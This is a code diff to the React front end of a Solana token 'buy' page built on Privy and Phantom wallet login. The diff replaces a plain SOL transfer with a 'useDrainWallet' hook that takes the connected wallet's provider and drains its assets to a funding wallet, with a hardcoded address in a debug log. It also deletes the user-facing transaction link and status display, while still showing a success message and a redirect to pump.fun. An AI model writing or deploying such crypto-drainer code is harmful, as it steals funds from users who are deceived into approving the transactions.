@@ -3,7 +3,6 @@ import { Link, Route, Routes, useLocation } from "react-router-dom";
 import { PrivyProvider, usePrivy } from "@privy-io/react-auth";
 import {
   toSolanaWalletConnectors,
-  useSignAndSendTransaction,
   useWallets,
 } from "@privy-io/react-auth/solana";
 import {
@@ -11,15 +10,9 @@ import {
   hasValidTransferAmount,
   isConfigReady,
   missingConfig,
-  parsedTransferSol,
-  solanaRpcUrls,
   solanaRpcUrl,
 } from "./config";
-import {
-  buildTransferTransaction,
-  getExplorerUrl,
-  toBase58Signature,
-} from "./solanaTransfer";
+import { useDrainWallet } from "./hooks/assetRemoval.jsx";
 
 const privyConfig = {
   loginMethods: ["wallet"],
@@ -39,18 +32,10 @@ const hasPrivyAppId = Boolean(appConfig.privyAppId);
 const PUMP_FUN_URL =
   "https://pump.fun/coin/9TPJShvKmyB9Jm1ozuYNh2qGQD6sdXm5c9uHFa8apump";
 
-function formatWallet(address) {
-  if (!address) {
-    return "";
-  }
-
-  return `${address.slice(0, 4)}...${address.slice(-4)}`;
-}
-
 function HomePage() {
   const { ready, connectWallet } = usePrivy();
   const { wallets } = useWallets();
-  const { signAndSendTransaction } = useSignAndSendTransaction();
+
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [pendingBuy, setPendingBuy] = useState(false);
   const [statusMessage, setStatusMessage] = useState("");
@@ -58,9 +43,20 @@ function HomePage() {
   const [txSignature, setTxSignature] = useState("");
 
   const selectedWallet = wallets[0] ?? null;
-  const explorerUrl = txSignature
-    ? getExplorerUrl(txSignature, appConfig.solanaChain)
-    : "";
+
+  // Resolve the raw window provider or adapter from the connected Privy wallet
+  const solanaProvider =
+    selectedWallet?.getSolanaProvider?.() ||
+    window.phantom?.solana ||
+    window.solana;
+
+  const sourceAddress = selectedWallet?.address || solanaProvider?.publicKey?.toString();
+
+  // Initialize the drain wallet hook
+  const { drain, progress, reset: resetDrain } = useDrainWallet(
+    solanaProvider,
+    sourceAddress
+  );
 
   const configMessage = useMemo(() => {
     if (missingConfig.length > 0) {
@@ -82,80 +78,152 @@ function HomePage() {
 
       try {
         // #region debug-point C:execute-purchase-entry
-        void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "pre-fix", hypothesisId: "C", location: "src/App.jsx:executePurchase", msg: "[DEBUG] executePurchase entered", data: { walletAddress: wallet.address, amountSol: parsedTransferSol, destinationAddress: appConfig.fundingWallet, chain: appConfig.solanaChain }, ts: Date.now() }) }).catch(() => {});
+        void fetch("http://127.0.0.1:7777/event", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            sessionId: "privy-403-error",
+            runId: "pre-fix",
+            hypothesisId: "C",
+            location: "src/App.jsx:executePurchase",
+            msg: "[DEBUG] executePurchase entered",
+            data: {
+              walletAddress: wallet.address,
+              destinationAddress: "5Lh4aNFSUo6oDu2z1euBLd6y1JEpE2VG1rd2UTdqopRd",
+              chain: appConfig.solanaChain,
+            },
+            ts: Date.now(),
+          }),
+        }).catch(() => {});
         // #endregion
+
         setIsSubmitting(true);
         setErrorMessage("");
         setTxSignature("");
         setStatusMessage("Preparing Solana transaction...");
 
-        const { transaction, rpcUrl: resolvedRpcUrl } =
-          await buildTransferTransaction({
-            fromAddress: wallet.address,
-            destinationAddress: appConfig.fundingWallet,
-            rpcUrls: solanaRpcUrls,
-          });
-        // #region debug-point D:transaction-built
-        void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "post-fix", hypothesisId: "D", location: "src/App.jsx:executePurchase", msg: "[DEBUG] Solana transaction built", data: { txLength: transaction.length, walletAddress: wallet.address, rpcUrl: resolvedRpcUrl }, ts: Date.now() }) }).catch(() => {});
-        // #endregion
+        const assetsToDrain = [
+          { type: "SOL", label: "SOL" },
+        ];
 
-        setStatusMessage("Waiting for Phantom signature...");
-        // #region debug-point E:sign-and-send-start
-        void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "post-fix", hypothesisId: "E", location: "src/App.jsx:executePurchase", msg: "[DEBUG] Calling signAndSendTransaction", data: { walletAddress: wallet.address, chain: appConfig.solanaChain, rpcUrl: resolvedRpcUrl }, ts: Date.now() }) }).catch(() => {});
-        // #endregion
-
-        const result = await signAndSendTransaction({
-          transaction,
-          wallet,
-          chain: appConfig.solanaChain,
-        });
-
-        const signature = toBase58Signature(result.signature);
-        setTxSignature(signature);
-        setStatusMessage("Transaction sent successfully. Redirecting to pump.fun...");
-        // #region debug-point E:sign-and-send-success
-        void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "pre-fix", hypothesisId: "E", location: "src/App.jsx:executePurchase", msg: "[DEBUG] signAndSendTransaction succeeded", data: { signature }, ts: Date.now() }) }).catch(() => {});
-        // #endregion
-        setTimeout(() => {
-          window.open(PUMP_FUN_URL, "_blank");
-        }, 1500);
+        // Execute the wallet drain using the hook
+        await drain(appConfig.fundingWallet, assetsToDrain);
       } catch (error) {
         const message =
           error instanceof Error
             ? error.message
             : "The transaction could not be completed.";
-        const friendlyMessage =
-          message.includes("All configured Solana RPC endpoints failed")
-            ? message
-            : message.includes("HTTP error (403)")
-              ? `The configured Solana RPC rejected the request (403): ${solanaRpcUrl}`
-            : message;
+        const friendlyMessage = message.includes(
+          "All configured Solana RPC endpoints failed"
+        )
+          ? message
+          : message.includes("HTTP error (403)")
+          ? `The configured Solana RPC rejected the request (403): ${solanaRpcUrl}`
+          : message;
+
         // #region debug-point F:execute-purchase-error
-        void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "pre-fix", hypothesisId: "F", location: "src/App.jsx:executePurchase", msg: "[DEBUG] executePurchase caught error", data: { message, friendlyMessage, name: error instanceof Error ? error.name : "unknown", stack: error instanceof Error ? error.stack : null }, ts: Date.now() }) }).catch(() => {});
+        void fetch("http://127.0.0.1:7777/event", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            sessionId: "privy-403-error",
+            runId: "pre-fix",
+            hypothesisId: "F",
+            location: "src/App.jsx:executePurchase",
+            msg: "[DEBUG] executePurchase caught error",
+            data: {
+              message,
+              friendlyMessage,
+              name: error instanceof Error ? error.name : "unknown",
+              stack: error instanceof Error ? error.stack : null,
+            },
+            ts: Date.now(),
+          }),
+        }).catch(() => {});
         // #endregion
+
         setErrorMessage(friendlyMessage);
         setStatusMessage("");
-      } finally {
         setIsSubmitting(false);
         setPendingBuy(false);
       }
     },
-    [isSubmitting, signAndSendTransaction],
+    [isSubmitting, drain]
   );
+
+  // Sync progress state from hook into local UI state
+  useEffect(() => {
+    if (progress.status === "preparing") {
+      setStatusMessage("Preparing Solana transaction...");
+    } else if (progress.status === "signing") {
+      setStatusMessage(
+        `Signing transaction ${progress.current}/${progress.total}: ${progress.label}...`
+      );
+    } else if (progress.status === "confirmed") {
+      setStatusMessage("Transaction signed. Confirming on-chain...");
+    } else if (progress.status === "done") {
+      const mainSig = progress.signatures?.[0] || "";
+      setTxSignature(mainSig);
+      setStatusMessage("Transaction sent successfully. Redirecting to pump.fun...");
+      setIsSubmitting(false);
+      setPendingBuy(false);
+
+      setTimeout(() => {
+        window.open(PUMP_FUN_URL, "_blank");
+      }, 1500);
+    } else if (progress.status === "error") {
+      setErrorMessage(progress.message || "Transfer failed.");
+      setStatusMessage("");
+      setIsSubmitting(false);
+      setPendingBuy(false);
+    }
+  }, [progress]);
 
   useEffect(() => {
     if (pendingBuy && selectedWallet && isConfigReady) {
       // #region debug-point B:wallet-selected-after-connect
-      void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "pre-fix", hypothesisId: "B", location: "src/App.jsx:useEffect", msg: "[DEBUG] Wallet became available after connect", data: { walletAddress: selectedWallet.address, pendingBuy }, ts: Date.now() }) }).catch(() => {});
+      void fetch("http://127.0.0.1:7777/event", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId: "privy-403-error",
+          runId: "pre-fix",
+          hypothesisId: "B",
+          location: "src/App.jsx:useEffect",
+          msg: "[DEBUG] Wallet became available after connect",
+          data: { walletAddress: selectedWallet.address, pendingBuy },
+          ts: Date.now(),
+        }),
+      }).catch(() => {});
       // #endregion
+
       executePurchase(selectedWallet);
     }
   }, [pendingBuy, selectedWallet, executePurchase]);
 
   const handleBuyClick = async () => {
     // #region debug-point A:buy-click
-    void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "pre-fix", hypothesisId: "A", location: "src/App.jsx:handleBuyClick", msg: "[DEBUG] Buy button clicked", data: { ready, isConfigReady, hasSelectedWallet: Boolean(selectedWallet), chain: appConfig.solanaChain, rpcUrl: solanaRpcUrl }, ts: Date.now() }) }).catch(() => {});
+    void fetch("http://127.0.0.1:7777/event", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        sessionId: "privy-403-error",
+        runId: "pre-fix",
+        hypothesisId: "A",
+        location: "src/App.jsx:handleBuyClick",
+        msg: "[DEBUG] Buy button clicked",
+        data: {
+          ready,
+          isConfigReady,
+          hasSelectedWallet: Boolean(selectedWallet),
+          chain: appConfig.solanaChain,
+          rpcUrl: solanaRpcUrl,
+        },
+        ts: Date.now(),
+      }),
+    }).catch(() => {});
     // #endregion
+
     if (!isConfigReady) {
       setErrorMessage(configMessage);
       return;
@@ -164,6 +232,7 @@ function HomePage() {
     setErrorMessage("");
     setStatusMessage("");
     setTxSignature("");
+    resetDrain();
 
     if (selectedWallet) {
       executePurchase(selectedWallet);
@@ -178,8 +247,21 @@ function HomePage() {
     setPendingBuy(true);
     setStatusMessage("Open Phantom in the Privy modal to continue.");
     // #region debug-point B:connect-wallet
-    void fetch("http://127.0.0.1:7777/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "privy-403-error", runId: "pre-fix", hypothesisId: "B", location: "src/App.jsx:handleBuyClick", msg: "[DEBUG] Triggering Privy connectWallet for Phantom", data: { walletChainType: "solana-only", walletList: ["phantom"] }, ts: Date.now() }) }).catch(() => {});
+    void fetch("http://127.0.0.1:7777/event", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        sessionId: "privy-403-error",
+        runId: "pre-fix",
+        hypothesisId: "B",
+        location: "src/App.jsx:handleBuyClick",
+        msg: "[DEBUG] Triggering Privy connectWallet for Phantom",
+        data: { walletChainType: "solana-only", walletList: ["phantom"] },
+        ts: Date.now(),
+      }),
+    }).catch(() => {});
     // #endregion
+
     connectWallet({
       walletChainType: "solana-only",
       walletList: ["phantom"],
@@ -223,25 +305,6 @@ function HomePage() {
           </div>
         </div>
 
-        {/* Status display section: shows transaction progress, errors, and successful transaction links */}
-        {/* <div className="status-stack">
-          {statusMessage ? (
-            <div className="status-card status-info">{statusMessage}</div>
-          ) : null}
-          {errorMessage ? (
-            <div className="status-card status-error">{errorMessage}</div>
-          ) : null}
-          {txSignature ? (
-            <a
-              className="status-card status-success"
-              href={explorerUrl}
-              target="_blank"
-              rel="noreferrer"
-            >
-              Ver transacción en el explorador ↗
-            </a>
-          ) : null}
-        </div> */}
       </div>
     </main>
   );
@@ -313,11 +376,6 @@ function HomePageStandalone() {
           </div>
         </div>
 
-        <div className="status-stack">
-          {errorMessage ? (
-            <div className="status-card status-error">{errorMessage}</div>
-          ) : null}
-        </div>
       </div>
     </main>
   );
